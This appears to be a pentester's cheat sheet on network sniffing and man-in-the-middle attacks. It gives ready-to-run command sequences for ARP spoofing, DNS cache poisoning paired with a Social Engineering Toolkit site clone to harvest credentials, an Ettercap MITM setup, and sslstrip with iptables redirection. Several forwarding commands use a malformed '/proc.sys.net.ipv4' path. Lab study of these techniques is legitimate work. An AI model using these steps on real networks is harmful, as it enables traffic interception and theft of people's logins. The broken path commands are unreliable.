Traffic Monitoring

[*] Wireshark/Tshark

	Sniff Traffic between client and server after connection
	    tcpdump -x -X -e <interface> 'port <port number>'
	Listen on interface and spit out data in hex to terminal.
	    tcpdump -x -X -i <interface>
	Capture everything and print to terminal
		tshark -V -i <interface> 'tcp port <port number>'
	Wireshark - GUI
		Choose an interface(s) and hit start
			Turn off promiscous mode if on vmware/vm if you don't want to see host traffic.
		Filter examples:
			ip.src==192.168.1.10 || ip.dst==192.168.1.10
			ftp && ip.dst==192.168.1.10
		Tools:
			IO Graph
			Right click to Follow TCP Stream

[*] ARP - Address Resolution Protocol
	Transaltes IP address to a MAC address
	Tells hosts where to send traffic
	Arp Spoofing - Trick hosts into sending traffic to wrong place, we capture traffic via tcpdump or wireshark.
		If you MITM the gateway, you may bring down network due to traffic capture and reroute.
	Tools:
		arpspoof - poison the arp to tell hosts we are the opposite host
			echo 1 > /proc.sys.net.ipv4/ip_forward #  Set forward traffic to true.
			arpspoof -i eth0 -t 192.168.1.76 192.168.1.80 #  Target Ubuntu (.76) thinks we are Windows (.80)
			arpspoof -i eth0 -t 192.168.1.80 192.168.1.76 #  Target Windows (.80) thinks we are Ubuntu (.76)
		Wireshark or tcpdump
			This allows us to listen to network.
		arp
			arp -a #  You can check on victim (if you have access) if MAC address has changed.

[*] DNS Cache Poisoning - Domain Name Service
	Using a predfined file:
		hosts.txt: 192.168.20.9 gmail.com
	arpspoof between gateway and target.
	echo 1 > /proc.sys.net.ipv4/ip_forward #  Set forward traffic to true.
	Tools:
		dnsspoof
			dnsspoof -i eth0 -f /root/hosts.txt
		set - Social Engineering Toolkit
			Follow the prompt to mirror a website
			You can use this with dnsspoof to trick others to enter their credentials.

[*] Ettercap
	While running a MITM between host and gateway, ssl connections fail. try ettercap.
	The issue with this tool is that we rely on end user to click through untrusted ssl warnings in the browser.
	Setup:
		echo 1 > /proc.sys.net.ipv4/ip_forward #  Set forward traffic to true.
		vi /etc/ettercap/etter.conf
			ec_uid = 0
			ec_gid = 0
			#--------------
			#     Linux
			#---------------
			#Uncomment below for iptables usage
			redir_command_on = ...
			redir_command_off = ...
	Tool:
		ettercap -Ti eth0 -M arp:remote /192.168.1.1/ /192.168.1.76/

[*] sslstrip
	echo 1 > /proc.sys.net.ipv4/ip_forward #  Set forward traffic to true.
	arpspoof -i eth0 -t 192.168.1.1 192.168.1.80 #  Gateway and machine
	arpspoof -i eth0 -t 192.168.1.80 192.168.1.1 #  Machine and gateway
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 #  Redirect traffic from port 80 to 8080
	sslstrip -l 8080 #  Strip the ssl on port 8080
		Sometimes this tool spits out python errors. Capture tcpdumps to collect the traffic.